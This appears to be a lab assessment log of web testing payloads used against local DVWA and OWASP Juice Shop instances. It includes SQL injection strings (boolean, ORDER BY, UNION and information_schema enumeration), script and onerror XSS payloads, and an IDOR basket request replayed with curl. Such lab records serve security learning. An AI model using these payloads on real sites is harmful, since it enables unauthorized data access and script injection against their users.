# Web Application Testing Payloads

This file records the payloads and API request patterns used during the web application security assessment. All testing was performed only against local DVWA and OWASP Juice Shop Docker environments.

---

## 1. SQL Injection Payloads

Target:

```text
DVWA → SQL Injection
```

### Basic Injection Validation

```sql
1' OR '1'='1
```

Purpose:

Used to confirm whether user input was being directly interpreted as part of the backend SQL query.

---

### Column Discovery

```sql
1' ORDER BY 1#
```

```sql
1' ORDER BY 2#
```

```sql
1' ORDER BY 3#
```

Purpose:

Used to identify the number of columns in the backend query before attempting UNION-based extraction.

Observation:

`ORDER BY 1` and `ORDER BY 2` worked successfully.  
`ORDER BY 3` generated an error, confirming a two-column query structure.

---

### UNION-Based Extraction

```sql
1' UNION SELECT user(), database()#
```

Purpose:

Used to verify whether attacker-controlled SQL output could be returned in the application response.

Observed output included:

```text
User: app@localhost
Database: dvwa
```

---

### Database Metadata Enumeration

```sql
1' UNION SELECT table_name, table_schema FROM information_schema.tables#
```

Purpose:

Used to enumerate internal database metadata through the SQL Injection vulnerability.

---

## 2. Cross-Site Scripting Payloads

Target:

```text
DVWA → XSS (Reflected)
DVWA → XSS (Stored)
```

### Reflected XSS

```html
<script>alert('XSS')</script>
```

Purpose:

Used to confirm whether unsanitized input was reflected back into the browser and executed as JavaScript.

---

### Alternate Reflected XSS Payload

```html
<img src=x onerror=alert('XSS')>
```

Purpose:

Used to validate JavaScript execution through an HTML event handler.

---

### Stored XSS

```html
<script>alert('Stored XSS')</script>
```

Purpose:

Used to confirm whether a script payload could be stored by the application and executed when the affected page was revisited.

---

## 3. IDOR / Broken Access Control Testing

Target:

```text
OWASP Juice Shop → Basket API
```

### Original Observed Request

```http
GET /rest/basket/6
```

Purpose:

Observed during normal authenticated basket access for the logged-in test account.

---

### Modified Object Reference

```http
GET /rest/basket/4
```

Purpose:

Used to test whether changing the basket identifier could expose another user's basket data.

---

### cURL Replay Pattern

```bash
curl 'http://localhost:3000/rest/basket/4' \
-X GET \
-H 'Authorization: Bearer <token>'
```

Observation:

The modified authenticated request returned basket data linked to a different user identifier.

Example observed response:

```json
{
  "status": "success",
  "data": {
    "id": 4,
    "UserId": 11,
    "Products": [
      {
        "name": "Raspberry Juice (1000ml)"
      }
    ]
  }
}
```

---

## 4. Authentication Testing Inputs

Target:

```text
OWASP Juice Shop → Login / Registration
```

### Invalid User Login Test

```text
Email: abc@abc.com
Password: invalidpassword
```

Observation:

The application returned a generic error message.

```text
Invalid email or password.
```

---

### Valid User with Wrong Password

```text
Email: poojan004@test.com
Password: incorrectpassword
```

Observation:

The application returned the same generic error message.

```text
Invalid email or password.
```

This behavior reduced account enumeration risk.

---

### Weak Password Registration Test

```text
Password: 12345
```

Observation:

The application accepted weak password registration, indicating insufficient password policy enforcement.

---

### Brute Force Behavior Check

Multiple invalid login attempts were submitted consecutively.

Observation:

No visible rate limiting, CAPTCHA, delay, or account lockout behavior was observed during manual testing.

---

## 5. Security Misconfiguration Test Inputs

Target:

```text
DVWA → SQL Injection
OWASP Juice Shop → API Response Headers
```

### Verbose SQL Error Trigger

```sql
'
```

Purpose:

Used to check whether malformed SQL input exposed verbose backend error behavior.

---

### Observed Response Headers

```http
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-Recruiting: /#/jobs
```

Observations:

- `Access-Control-Allow-Origin: *` indicated permissive CORS behavior.
- `Content-Security-Policy` was not observed.
- `Strict-Transport-Security` was not observed.
- `X-Recruiting` exposed non-essential application information.

---

## Notes

These payloads were used only in a controlled local lab environment.

No testing was performed against any production system or third-party target.
